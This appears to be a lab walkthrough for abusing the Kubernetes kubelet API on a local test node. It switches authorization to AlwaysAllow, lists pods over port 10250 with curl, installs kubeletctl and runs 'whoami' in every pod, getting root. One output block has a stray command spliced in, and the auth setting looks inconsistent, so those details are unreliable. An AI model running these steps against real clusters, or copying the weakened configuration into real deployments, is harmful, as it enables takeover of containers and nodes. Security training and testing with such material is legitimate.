
#### Step 1 Make a request to Kubelet API:
```sh
apt install net-tools
netstat -ntlp
curl -k -X GET https://localhost:10250/pods
```
#### Step 2 Modify the Kubelet Configuration file:
```sh
cd /var/lib/kubelet
cp config.yaml config.yaml.bak
```

```sh
Set anonymous auth to false
Authorization Mode to AlwaysAllow
```

```sh
systemctl restart kubelet
systemctl status kubelet
```

#### Step 3 Make Request to Kubelet API:
```sh
curl -k -X GET https://localhost:10250/pods
"""
          {
            "name": "kube-scheduler",
            "state": {
              "running": {
                "startedAt": "2023-11-02T15:05:19Z"
              }
            },kubeletctl pods -i
            "lastState": {},
            "ready": true,
            "restartCount": 2,
            "image": "k8s.gcr.io/kube-scheduler:v1.24.2",
"""
```
#### Step 4 Download kubeletctl:

##### GitHub Repo

https://github.com/cyberark/kubeletctl

```sh
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.6/kubeletctl_linux_amd64 && chmod a+x ./kubeletctl_linux_amd64 && mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```

```sh
kubeletctl pods -i
"""
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                  Pods from Kubelet                                  │
├───┬────────────────────────────────────────┬──────────────┬─────────────────────────┤
│   │ POD                                    │ NAMESPACE    │ CONTAINERS              │
├───┼────────────────────────────────────────┼──────────────┼─────────────────────────┤
│ 1 │ kube-controller-manager-pat-virtualbox │ kube-system  │ kube-controller-manager │
│   │                                        │              │                         │
"""
kubeletctl run "whoami" --all-pods -i
"""
5. Pod: kube-proxy-h6zrm
   Namespace: kube-system
   Container: kube-proxy
   Url: https://127.0.0.1:10250/run/kube-system/kube-proxy-h6zrm/kube-proxy
   Output: 
root
"""
```

#### Step 5 Verify the certificate of the kubelet for node authorizer group:
```sh
openssl x509 -in  /var/lib/kubelet/pki/kubelet-client-current.pem -text -noout
#Subject: O = system:nodes, CN = system:node:pat-virtualbox
```
